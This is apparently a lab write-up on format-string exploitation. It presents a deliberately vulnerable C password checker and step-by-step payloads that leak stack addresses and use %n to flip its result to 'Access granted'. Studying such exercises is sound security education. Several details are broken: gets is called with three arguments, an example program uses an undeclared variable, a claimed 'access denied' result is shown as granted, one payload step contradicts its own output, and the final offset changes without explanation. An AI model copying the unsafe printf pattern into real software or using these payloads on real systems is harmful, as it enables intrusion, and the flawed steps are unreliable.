# Redirecting Code Flow

**vuln03.c**

```c
#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<stdbool.h>

char password[] = "Nz!Tvq4s!Q5ttx1se"; // password = My Sup3r P4ssw0rd

void main(){
    char buffer[512];
    bool* equal = malloc(1); // pointer to result is placed in stack
    for(char *c = password ; *c ; ++c)
        *c -= 1;
    printf("Insert password: ");
    gets(buffer,sizeof(buffer),stdin);
    *equal = !strcmp(password,buffer); // notice the vuln function has to be after the setting of equal
    printf("Validating password: ");
    printf(buffer);
    if (*equal)
        printf("\n[+] Access granted\n");
    else
        printf("\n[-] Access denied\n");
    free(equal);
}
```

- Here we need to redirect the code flow from `Access Denied` to `Access Granted` branch
- To do this we are going to manipulate the `bool* equal = malloc(1)` pointer in the stack

## Exploiting the binary

### Finding the address you want to write to 

- Leak addresses from the stack

```
python3 -c 'print(" %x "*10)' | ./vuln03 
Insert password: Validating password:  46c6b016  0  0  9a42fcf0  15  46c6d021  487322a0  20782520  20782520  20782520 
[-] Access denied
```

- Few of these look like memory addresses, but we are not sure
- Check them in gdb
- The strcmp is checking the return address, then setting the lowest byte of the edx
- Setting the result to whatever rax is pointing at

```
00000000012b1 <+168>:	lea    rdi,[rip+0x2d58]        # 0x4010 <password>
   0x00000000000012b8 <+175>:	call   0x10f0 <strcmp@plt>
   0x00000000000012bd <+180>:	test   eax,eax
   0x00000000000012bf <+182>:	sete   dl
   0x00000000000012c2 <+185>:	mov    rax,QWORD PTR [rbp-0x218]
```

- It is holding a point to `rbp-0x210`
- rbp - anything is local variable and + something is a parameter sent to the function
- This is a local variable and must have been initialized at the beginning of the function

- Placing a break point where the address is defined using malloc, and examine the value of rax we find the address we are interested in

```
(gdb) x/gx $rax
0x5555555592a0:	0x0000000000000000
```

```
python3 -c 'print(" %p "*10)' | ./vuln03 
Insert password: Validating password:  0x5620b87ac016  (nil)  (nil)  0x7ffdf3b98e30  0x15  0x5620b87ae021  0x5620ba76e2a0  0x2070252020702520  0x2070252020702520  0x2070252020702520 
[-] Access denied
```

- From the dump we see the address with the same offset at 7th position
- This is the address we are going to write to 

### Writing to the address

- We need to write to this memory address in the stack. 
- To do this we need the `%n` specifier
- It writes whatever number of characters have already been printed out by the current printf to the position in memory currently referenced

**n.c**

```c
#include<stdio.h>
void main(){
        int i;
        printf("teenage                                         %nninja\n", &i);
        printf("%*sturtles\n", n, "");
}
```

- Here there is a `%n` just before ninja
- It stores the number of characters already printed into the value pointed by variable `i`
- It is then used to space out the next string turtles on the next line to match ninja on the previous line

```
./n 
teenage                                         ninja
                                                turtles
```

**vuln03.c**

- Confirm the address using direct parameter access

```
 python3 -c 'print(" %7$p ")' | ./vuln03 
Insert password: Validating password:  0x556bcad1c2a0 
[-] Access denied
```

- Now if we change the access specifier to `%n` it will write a 0 to that address and will give access denied

```
python3 -c 'print(" %7$n ")' | ./vuln03 
Insert password: Validating password:   
[+] Access granted
```

- If we print one character first, then it will write 1 to the stack which will be considered as true

```
 python3 -c 'print(" a%7$n ")' | ./vuln03 
Insert password: Validating password:  a 
[+] Access granted
```

- Therefore we get access granted

## Second method of writing to the memory

- This is also using `%n` but instead of relying on finding the address on the stack, we will provide it ourselves into the payload we are injecting
- This provides more flexibility in terms of options where to write it
- However, the first way can help to bypass ASLR

```py
buf = "AAAAAAAA"
buf += " %p " *10
print(buf)
```

- If we place a value in the injected payload, it will be accessible using direct parameter access
- The assumes that the string is stored in the stack
- As we see that the string that we are injecting will be put in the stack

```
python3 asd.py > x && cat x | ./vuln03 
Insert password: Validating password: AAAAAAAA 0x560c71b5f016  (nil)  (nil)  0x7ffd5438e980  0x15  0x560c71b61021  0x560c72e722a0  0x4141414141414141  0x2070252020702520  0x2070252020702520 
[-] Access denied
```

- We see where the string is put in the stack
- As we see here at 8th position there is 8 A's placed in the stack
- We can directly access the value that we have entered using `%8$p`

```py
buf = "AAAAAAAA"
buf += " %8$p "
print(buf)
```

```
python3 asd.py > x && cat x | ./vuln03 
Insert password: Validating password: AAAAAAAA 0x4141414141414141 
[-] Access denied
```

- If we were to change the variable to true using this technique the we will have to do the following
- The pointer to the equal value was in the 7th position


**Switch off the ASLR** for this

```
 python3 asd.py > x && cat x | ./vuln03 
Insert password: Validating password: AAAAAAAA 0x555555556016  (nil)  (nil)  0x7fffffffdf90  0x15  0x555555558021  0x5555555592a0  0x4141414141414141  0x2070252020702520  0x2070252020702520 
[-] Access denied
```

- Take the address and paste it in the code
- Confirm that we access exactly that address from the stack

```py
#0x5555555592a0
buf = "\xa0\x92\x55\x55\x55\x55"
buf += "%7$p"
print(buf)
```

```
python3 asd.py > x && cat x | ./vuln03 
Insert password: Validating password:  UUUU0x5555555592c2a0c2
[-] Access denied
```

- Replacing the `%p` with `%n` , it will write the number for us
- Since the memory address we have printed so far has that length
- As any value other than 0 is considered true, we get access granted

```py
#0x5555555592a0
buf = "\xa0\x92\x55\x55\x55\x55"
buf += " %7$p"
print(buf)
```

```
python3 asd.py > x && cat x | ./vuln03 
Insert password: Validating password:  UUUU 0x5555555592a0
[-] Access denied
```


## Difference between finding the address in the stack and directly injecting it in the payload

- With ASLR on the same location that we were accessing will be randomized. 
- If the randomization is poor, we can brute force the position

- However, we can write to the same position in the stack using the previous payload

```
python -c 'print("a%6$n")' | ./vuln03
```

- As the relevant position in the stack is not changed, only the address is randomized

